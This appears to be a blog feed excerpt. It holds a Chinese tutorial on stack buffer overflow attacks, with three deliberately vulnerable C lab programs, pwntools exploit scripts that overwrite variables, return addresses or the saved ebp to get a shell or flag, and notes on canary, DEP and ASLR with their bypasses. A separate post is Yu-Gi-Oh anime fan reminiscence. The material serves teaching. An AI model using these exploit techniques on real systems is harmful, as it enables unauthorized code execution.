width="500"></p><p>对应的汇编代码：</p><h3 id="Frame-Pointer帧指针">Frame Pointer帧指针</h3><p>栈的生长方向是从高地址向低地址。</p><p>帧指针ebp(in 32bit)，rbp(in 64bit)。</p><p>frame pointer(ebp)是用来access内存域内的局部变量的，在汇编代码中，function域内的局部变量都是通过ebp+栈上偏移量来表达的(寄存器相对寻址)。</p><p>因为存在嵌套调用，比如a函数调用b函数，b函数调用c函数，为了快速定位函数内部的局部变量在内存上的位置，每个函数域都有自己的ebp，在进入另一个域后需要先Push前一个域的ebp，再set自己的ebp。相当于各个函数划分stack memory为不同的stack frame，各个frame有自己的frame pointer，即ebp。</p><h3 id="Stack-Pointer栈指针">Stack Pointer栈指针</h3><p>栈指针esp(in 32bit)，rsp(in 64bit)。始终指向栈顶。</p><p>Push pop</p><h3 id="汇编指令">汇编指令</h3><p>在实际汇编指令操作中，一个func被call会经历：</p><ul class="lvl-0"><li class="lvl-2"><p>push参数入栈</p></li><li class="lvl-2"><p>call func命令，然后PC跳转到func开头</p></li><li class="lvl-2"><p>push ebp(push前一个frame的ebp)</p></li><li class="lvl-2"><p>mov esp, ebp(把当前栈顶位置赋值给ebp)</p></li><li class="lvl-2"><p>一堆函数内部过程</p></li><li class="lvl-2"><p>leave命令</p></li><li class="lvl-2"><p>ret命令</p></li></ul><p>这里涉及到了三个汇编指令,call、leave和ret。</p><h4 id="call指令">call指令</h4><p>包含两步操作：</p><ol><li class="lvl-3"><p>push $eip, 相当于push了return address</p></li><li class="lvl-3"><p>跳转到func的地址，即标号地址</p></li></ol><h4 id="leave指令">leave指令</h4><p>包含两步操作：</p><ol><li class="lvl-3"><p>mov $ebp, $esp(esp指向当前frame的ebp)</p></li><li class="lvl-3"><p>pop $ebp, 把previous ebp的值赋给$ebp，即是指向上一个frame的ebp，准备返回了</p></li></ol><h4 id="ret指令">ret指令</h4><p>就是pop $eip的操作，结束函数，根据return address返回</p><h2 id="攻击原理">攻击原理</h2><p>通过buffer overflow去overwrite栈上的return address并写入一段恶意代码，通过新的return address跳转到恶意代码起始处去执行恶意代码即可。</p><p><img src="/2020/07/18/SoftwareSecurity1/1720265572567.png" alt="" width="500"></p><p>恶意代码可以引用一些现成的shellcode。</p><p>我们主要的工作是找到return address，如果堆栈地址是随机化的，我们可以通过暴力搜索，但一般是固定的，可以通过观察计算得到。</p><p>为了简化计算，我们可以在新的return address和malicious code间插入NOP，NOP是不会被执行的并会跳到下一条指令，这样我们就不需要精确地计算malicious code的起始位置，而只需要保证我们新的return address是在malicious code前就可以了。</p><p><img src="/2020/07/18/SoftwareSecurity1/1720265607952.png" alt="" width="500"></p><h2 id="攻击示例">攻击示例</h2><h3 id="Victim1">Victim1</h3><p>Overwrite变量值来拿到shell。</p><p>通过攻击改变程序的控制流。</p><h4 id="源代码">源代码</h4><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token comment">//victim1.c</span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdio.h></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdlib.h></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;string.h></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token macro-name">LENGTH</span> <span class="token expression"><span class="token number">256</span></span></span><span class="token keyword">void</span> <span class="token function">hear</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">char</span> flag <span class="token operator">=</span> <span class="token char">'N'</span><span class="token punctuation">;</span>    <span class="token keyword">char</span> str<span class="token punctuation">[</span>LENGTH<span class="token punctuation">]</span><span class="token punctuation">;</span>     <span class="token function">gets</span><span class="token punctuation">(</span>str<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>flag <span class="token operator">==</span> <span class="token char">'Y'</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"[HACKED]\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">execve</span><span class="token punctuation">(</span><span class="token string">"/bin/sh"</span><span class="token punctuation">,</span> <span class="token constant">NULL</span><span class="token punctuation">,</span> <span class="token constant">NULL</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>   <span class="token punctuation">&#125;</span><span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token keyword">int</span> argc<span class="token punctuation">,</span> <span class="token keyword">char</span><span class="token operator">*</span> argv<span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Hi. Tell me something, less than %d charecters ...\n"</span><span class="token punctuation">,</span> LENGTH<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">hear</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"end\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="过程">过程</h4><p>栈的布局如下所示：</p><p><img src="/2020/07/18/SoftwareSecurity1/1720265784412.png" alt="" width="500"></p><p>所以只要溢出一个字符'Y'来覆盖'N'即可。</p><h4 id="攻击脚本">攻击脚本</h4><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span><span class="token comment">#process的作用是运行本地的程序，如果要攻击远端服务器，可以用remote(ip, port)</span>io <span class="token operator">=</span> process<span class="token punctuation">(</span><span class="token string">'./victim1'</span><span class="token punctuation">)</span>payload <span class="token operator">=</span> <span class="token string">'A'</span><span class="token operator">*</span><span class="token number">256</span><span class="token operator">+</span><span class="token string">'Y'</span>io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload<span class="token punctuation">)</span> <span class="token comment">#向程序发送内容作为输入流</span>io<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token comment">#进入交互模式</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>然后可以得到shell。</p><p><img src="/2020/07/18/SoftwareSecurity1/1720265844815.png" alt=""></p><h3 id="Victim2">Victim2</h3><p>Overwrite return address.</p><p>通过攻击使得程序泄露敏感信息flag。</p><h4 id="源代码-2">源代码</h4><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token comment">//victim2.c</span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdio.h></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdlib.h></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdbool.h></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stddef.h></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;string.h></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;unistd.h></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">"pwnable_harness.h"</span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token macro-name">LENGTH</span> <span class="token expression"><span class="token number">256</span></span></span><span class="token comment">//保存有敏感信息的文件,其内容为 flag&#123;e4d1cb5fe367e7803af80db0bed7f0c4&#125;</span><span class="token keyword">static</span> <span class="token keyword">const</span> <span class="token keyword">char</span><span class="token operator">*</span> flagfile <span class="token operator">=</span> <span class="token string">"flag.txt"</span><span class="token punctuation">;</span> <span class="token comment">/* Send the user the contents of the first flag file. */</span><span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">giveFlag</span><span class="token punctuation">(</span><span class="token keyword">void</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">char</span> flag<span class="token punctuation">[</span><span class="token number">64</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    FILE<span class="token operator">*</span> fp <span class="token operator">=</span> <span class="token function">fopen</span><span class="token punctuation">(</span>flagfile<span class="token punctuation">,</span> <span class="token string">"r"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span>fp<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token function">perror</span><span class="token punctuation">(</span>flagfile<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">return</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token function">fgets</span><span class="token punctuation">(</span>flag<span class="token punctuation">,</span> <span class="token keyword">sizeof</span><span class="token punctuation">(</span>flag<span class="token punctuation">)</span><span class="token punctuation">,</span> fp<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">fclose</span><span class="token punctuation">(</span>fp<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"[√] Your flag: %s\n"</span><span class="token punctuation">,</span> flag<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">void</span> <span class="token function">hear</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"[*] Hi, Give me password! \n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">char</span> buf<span class="token punctuation">[</span>LENGTH<span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token function">read</span><span class="token punctuation">(</span>STDIN_FILENO<span class="token punctuation">,</span> buf<span class="token punctuation">,</span> LENGTH<span class="token operator">*</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">strlen</span><span class="token punctuation">(</span>buf<span class="token punctuation">)</span> <span class="token operator">></span> <span class="token number">10</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"[x] Invalid Password \n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">exit</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token keyword">int</span> argc<span class="token punctuation">,</span> <span class="token keyword">char</span><span class="token operator">*</span><span class="token operator">*</span> argv<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token function">hear</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="过程-2">过程</h4><p>hear()里的read有LENGTH*2-LENGTH长度的溢出空间，其栈内存布局为：</p><p><img src="/2020/07/18/SoftwareSecurity1/1720265950346.png" alt="" width="500"></p><p>为了拿到flag文件的内容，我们的目标是去执行giveFlag()，所以用giveFlag()的地址去覆盖hear()的return address即可。</p><p>通过gdb去拿到giveFlag()的地址：</p><blockquote><p>gdb是 Linux 平台下最常用的一款程序调试器。可以用来进行启动程序、设置断点、单步调试、查看变量、反汇编等操作。</p></blockquote><p><img src="/2020/07/18/SoftwareSecurity1/1720265968586.png" alt=""></p><p>可以看到giveFlag函数在内存的起始地址是0x080486a6。</p><p>buffer的长度256+ebp的4字节+new return address构造payload，因为对buf有长度检查，所以前面要插入一个'\0'。这样去构造即可。</p><h4 id="攻击脚本-2">攻击脚本</h4><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>io <span class="token operator">=</span> process<span class="token punctuation">(</span><span class="token string">'./victim2'</span><span class="token punctuation">)</span><span class="token comment">#p32的作用是将一个数字转换为字符，0x080486a6会被转换为'\xa6\x86\x04\x08'，倒序是因为linux程序是小端规则的</span>payload <span class="token operator">=</span> <span class="token string">'A'</span> <span class="token operator">+</span> <span class="token string">'\0'</span> <span class="token operator">+</span> <span class="token number">258</span><span class="token operator">*</span><span class="token string">'A'</span> <span class="token operator">+</span> p32<span class="token punctuation">(</span><span class="token number">0x080486a6</span><span class="token punctuation">)</span> io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>io<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>结果长这样：</p><p><img src="/2020/07/18/SoftwareSecurity1/1720265987142.png" alt=""></p><h3 id="Victim3">Victim3</h3><p>构建Stack frame。</p><p>通过攻击使得程序泄露敏感信息flag。</p><h4 id="源代码-3">源代码</h4><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token comment">//victim3.c</span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdio.h></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdlib.h></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdbool.h></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stddef.h></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;string.h></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;unistd.h></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">"pwnable_harness.h"</span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token macro-name">LENGTH</span> <span class="token expression"><span class="token number">256</span></span></span><span class="token comment">//保存有敏感信息的文件,其内容为 flag&#123;c92ecee2359e0e5a41f1f0348a525417&#125;</span><span class="token keyword">static</span> <span class="token keyword">const</span> <span class="token keyword">char</span><span class="token operator">*</span> flagfile <span class="token operator">=</span> <span class="token string">"flag.txt"</span><span class="token punctuation">;</span><span class="token comment">/* Send the user the contents of the first flag file. */</span><span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">giveFlag</span><span class="token punctuation">(</span><span class="token keyword">void</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">char</span> flag<span class="token punctuation">[</span><span class="token number">64</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    FILE<span class="token operator">*</span> fp <span class="token operator">=</span> <span class="token function">fopen</span><span class="token punctuation">(</span>flagfile<span class="token punctuation">,</span> <span class="token string">"r"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span>fp<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token function">perror</span><span class="token punctuation">(</span>flagfile<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">return</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token function">fgets</span><span class="token punctuation">(</span>flag<span class="token punctuation">,</span> <span class="token keyword">sizeof</span><span class="token punctuation">(</span>flag<span class="token punctuation">)</span><span class="token punctuation">,</span> fp<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">fclose</span><span class="token punctuation">(</span>fp<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"[√] Your flag: %s\n"</span><span class="token punctuation">,</span> flag<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">void</span> <span class="token function">hear</span><span class="token punctuation">(</span><span class="token keyword">char</span><span class="token operator">*</span> arg<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">char</span> str<span class="token punctuation">[</span>LENGTH<span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token function">strcpy</span><span class="token punctuation">(</span>str<span class="token punctuation">,</span> arg<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">void</span> <span class="token function">handle_connection</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"[*] Hi, Give me something to overflow me!\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">char</span> secret<span class="token punctuation">[</span>LENGTH<span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token function">read</span><span class="token punctuation">(</span>STDIN_FILENO<span class="token punctuation">,</span> secret<span class="token punctuation">,</span> LENGTH<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">hear</span><span class="token punctuation">(</span>secret<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token keyword">int</span> argc<span class="token punctuation">,</span> <span class="token keyword">char</span><span class="token operator">*</span><span class="token operator">*</span> argv<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token function">handle_connection</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="过程-3">过程</h4><p>栈内存布局为：</p><p><img src="/2020/07/18/SoftwareSecurity1/1720260083575.png" alt="" width="500"></p><p>这题只有一个字节的溢出空间，可以修改handle_connection和hear两者frame内的ebp地址的最低位字节。</p><p>思路是这样的：handle_connection()中读入257个字符，进入hear()后，str所在的buffer读入了这257个字符，hear()的frame部分的ebp的最低位被修改。为了保证hear()中的strcpy()能够顺利执行，我们输入的第257位字符一定要是终结符。这样程序才不会发生错误。</p><p>当hear()执行完返回时(即执行leave指令的第二步pop $ebp)，这个错误的old ebp会被pop给$ebp。回到handle_connection()的frame，handle_connection()执行完毕返回时(即执行leave指令的第一步mov $ebp, $esp)，栈指针esp会指向这个错误的ebp位置，然后执行ret指令时也会pop错误的return address。我们的目标就是让程序能够在这一步跳到giveFlag()函数。</p><p>由于第257位字符是终结符0，这代表old ebp的最低位字节的地址被修改为'\x00'（在C中，'\0'='\x00'），那么被修改后的old ebp一定小于原先的old ebp。也就是说执行完handle_connection()的leave的第一步后，esp的位置应该在secret处(因为secret有256个字节长，基本可以确定范围)。可以在payload中加入giveFlag()的地址*n，只要被修改的ebp指向其中的任意一个giveFlag()地址开头，那么一定会pop地址给PC，进而执行giveFlag()。</p><p>所以我们保证修改后的ebp指向giveFlag()地址开头即可，先假设payload=addr32(giveFlag)*64，要计算一个偏移量来构造payload。</p><p>gdb打断点看一下函数执行到handle_connection()域时的ebp和esp的值：</p><p><img src="/2020/07/18/SoftwareSecurity1/1720266021011.png" alt="" width="700"></p><p>$ebp = 0xffffcb4c，$esp = 0xffffca4c，那么修改后的$ebp=0xffffcb00。0xcb00-0xca4c=180为4的倍数。所以修改后的ebp能刚好指向giveFlag()的开头，所以偏移量=0。</p><p>进而可以构造payload。</p><p>即使开启了ASLR，但偏移量总有可能是0，所以也不需要修改，多attack几次就能拿到flag。</p><p>在本地的结果：</p><p><img src="/2020/07/18/SoftwareSecurity1/1720266041103.png" alt=""></p><h4 id="攻击脚本-3">攻击脚本</h4><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>io <span class="token operator">=</span> process<span class="token punctuation">(</span><span class="token string">'./victim3'</span><span class="token punctuation">)</span>payload <span class="token operator">=</span> p32<span class="token punctuation">(</span><span class="token number">0x080486a6</span><span class="token punctuation">)</span><span class="token operator">*</span><span class="token number">64</span><span class="token operator">+</span><span class="token string">'\0'</span>io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>io<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="防御手段">防御手段</h2><h3 id="Canary">Canary</h3><p>在ebp下面放一个字作为canary,在程序调用结束之前(leave ret之前), 检查栈上的canary与寄存器中的canary是否相等，若不相等则调用中断程序。</p><p>攻击方式：printf格式化字符串漏洞攻击拉出canary。</p><h3 id="DEP-NX">DEP(NX)</h3><p>指定内存要么为RX(可读可执行)，要么为RW(可读可写)。</p><p>攻击方式：Code reuse attack, e.g., ret2libc</p><h3 id="ASLR">ASLR</h3><p>Address Space Layout Randomization(ASLR),地址空间布局随机化,每次程序运行时，其分布不完全固定而是随机的，那么我们无法确定return address，从而难以攻击。ASLR只打乱Stack区和lib，其他的如Heap和Text区并不会被打乱。</p><p>攻击方式：brute force，ret2ret，ret2pop，ret2esp之类的</p><h2 id="参考资料">参考资料</h2><p>[1] 老师课件02<br>[2] https://www.jianshu.com/p/4c0a30e7ddd2</p>]]></content>
      
      
      <categories>
          
          <category> 学习 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Security </tag>
            
            <tag> pwn </tag>
            
            <tag> Buffer Overflow </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>一飞冲天啊，我！</title>
      <link href="/2020/02/15/ygo/"/>
      <url>/2020/02/15/ygo/</url>
      
        <content type="html"><![CDATA[<blockquote><p>YGO动画相关的一些碎碎念。</p></blockquote><span id="more"></span><blockquote><p>大量剧透注意！！！<br>大量剧透注意！！！<br>大量剧透注意！！！</p></blockquote><p>封面是zexal里可爱的三妹，原画是伟大可爱无敌的横田明美老师。</p><p>  </p><p>第一次看你游是在电视上万能的点播台，小时候凭借这个消磨时间看完了各种大长篇，比如龙珠这种现在的我肯定不会去看的动漫。相比于大多数人对YGO的回忆是初代DM，我第一次看的是GX，似乎还是幼儿园的时候和表哥一起看的，大概是地域差异，我们这里的点播台YGO系列只有GX的资源，小学班上流行的也是GX的怪兽，比如E·Hero系列，常用来取绰号的“爆裂女郎”等等。实卡买过一两次(指盗版)，其他的都白嫖表哥的，对三幻神视若珍宝，然而现在找不到了(悲)。</p><p>小学村规层出不穷，表侧守备召唤是可以的，记得有个老哥在卡组顶上放了4张火炎地狱，开局还不洗牌，被同桌暴打。大多数卡组都是重坑，汉诺的崇高力量人手必备，还有羽毛扫、黑洞、旋风、魔法筒……乱七八糟的坑。还记得魔导战士这张卡特别受欢迎，可以放指示物破坏各种坑。不过我本身不怎么会打牌，还是旁观比较快乐。</p><p>当时点播台的资源不完整，只有GX七星篇，于是我又在电脑上补完了后面的……相比于班上擅长决斗却不怎么看动画的大家，我大概是少数知道“尤贝尔”这个人物的吧hhh</p><p>YGO系列对我而言是童年，是十多年后的现在依然热爱的动画作品，相比于数码宝贝、魔卡少女樱这些童年，YGO将触角通过卡片延伸到现实，在我的记忆里留下那些课间围观决斗的回忆，让我可以在多年后依然记得，自己曾将那张奥西里斯的天空龙交换给喜欢的那个人，成为一个被对方回忆时所可能触及的细节。</p><p>前段时间疫情在家，看微博太抑郁，学又学不进去，为了逃避现实去补了5ds和zexal，lofter很多太太的创作给了我力量，于是想把一些动画相关的吐槽和回忆整理写下来，谢谢YGO陪伴我度过童年，希望dl国服早点开放，有生之年能见到简中实卡发售，西恩国旗登上WCS。</p><p>  </p><h2 id="DM">DM</h2><p>说来惭愧，DM作为这个系列的开山之作，我只在小时候看过它的一部分——王之记忆篇，而且这部分基本上剧情占比重，决斗部分比较少，但是很精彩。所以我对DM的人物了解除了暗表游戏、海马就没什么了。上次去看了第一集，被风间的捧读笑到了，秒秒钟出戏，加上初代的画质劝退，遂罢。</p><p>一定要吐槽的话，就是暗表游戏你们也太gay了，曾经百科暗表词条有个gay台词合集，可惜被删了，于是我去找了一下，什么“我想和你永远在一起，就算找不回记忆也没关系”、“你在的时候我能感觉到好与坏，对现在的我来说除了空虚还是空虚”，太gay了我不行了。</p><p>话说这一作以口胡闻名，魔陷口胡就不说了，我还看到有人吐槽场地魔法的属性和怪兽属性之间的口胡。梗也非常多，比如被玩坏了的所列瓦多卡纳、风中残烛杀、鞭尸、马利克的颜艺等等。这一作的作监组合加加美和高桥和德很有名。加加美大神的指艺(prprpr)也非常好看。虽然原作已经是上个世纪的作品，动画播出也快20年了，这一部的人设毫不过时，游戏的时髦值在六代中依旧是顶流水平(比起游马奇怪的发型和作哥的紧身衣233)。到了20周年剧场版次元的暗面——这部由高桥和希担任制作总指挥，加加美大神担任总作监的作品里，游戏和海马帅出了新高度，白嫁的特效更是美哭了(还有暗表的糖，甜)。</p><p>作为开创时代的作品，人气很高，遗老也是最多的，很多的人就停留在了这里，没有再看后面的作品，感觉很可惜。</p><p>每次我看见lofter游戏王tag的一大堆暗表作品都好酸(虽然暗表真的很好磕，我磕爆)，什么时候你的后辈们也能有这么高的热度啊。</p><p>微博上@哉基基 太太的暗表同人《过去与未来》质量非常高。</p><p>  </p><h2 id="GX">GX</h2><p>GX永远是我心中的白月光。童年情怀加成MAX。</p><p>相比于DM的黑暗，GX一开始显得非常得日常，劝退了很多DM遗老。不过我觉得日常也挺好看的，毕竟旧呆辣么萌。得益于点播台，七星篇的每一集我都大概看了两遍以上吧。每场决斗的过程结果都很清楚了(点烟.jpg)。印象比较深的是吸血鬼那里，我童年的阴影·无敌·电子终结龙警告·凯撒因为对手搞事情输了。那一个对手打了三场。还有一个是三泽大地，现在他的名字已经被玩坏了，什么三泽天空、四泽海洋、五泽宇宙啥的，和虎妹打的那一场感觉特别搞笑，后来他还因为追求真爱失去了出场戏份，于是就被弄成梗了。还有一场印象也很深，和吹雪打的那一场，真红眼黑龙也是我的童年阴影，输了就掉进岩浆里，太可怕了。</p><p>日常里有一场是旧呆和同伴们在温泉里玩，突然就开始了和一个用青眼白龙的人打，那场结果也是输了，被吊打的感觉，于是青眼白龙也成了我童年记忆里nb的存在。每一个龙癌的诞生，都是从被虐开始的(掩面)。</p><p>你K为了卖卡，这代开始完善游戏机制了，口胡变少了。一开始的几场决斗，回合数少，构成也很简单，基本就是通召和魔陷的运用，融合出来基本决斗也结束了。相比于后几代，融合召唤的一大特点就是亏卡，于是你可以看见场场强欲壶，旧呆大概放了20张强欲壶吧2333后来强欲被禁，动画效果又出了一个强欲侠。</p><p>破灭之光篇的新角色爱德，cv竟然是石田彰，我可以。这个章节我没什么印象了，感觉脑子空空的，什么都没有留下(。</p><p>到了异次元篇，神展开开始了，旧呆唯一的挚友约翰出现了(<s>还有上辈子的老婆bushi</s>)。虽然尤贝尔长得很奇怪，还干了很多坏事，小时候我还是很喜欢ta的，可见人类的本质并不是颜狗。因为喜欢，我很想要一张尤贝尔的卡，可惜当时周围的人都没有。</p><p>顺便一说，GX的oped都挺燃的，可能是因为我小时候听得太多了，没法客观评价，毕竟一听到脑内就自动开始演唱。其中还有一首旧呆cvKENN亲自唱的。KENN一开始配旧呆的声音真的超嫩的(</p><p>  </p><h3 id="游城十代-Yuki-Judai">游城十代 Yuki 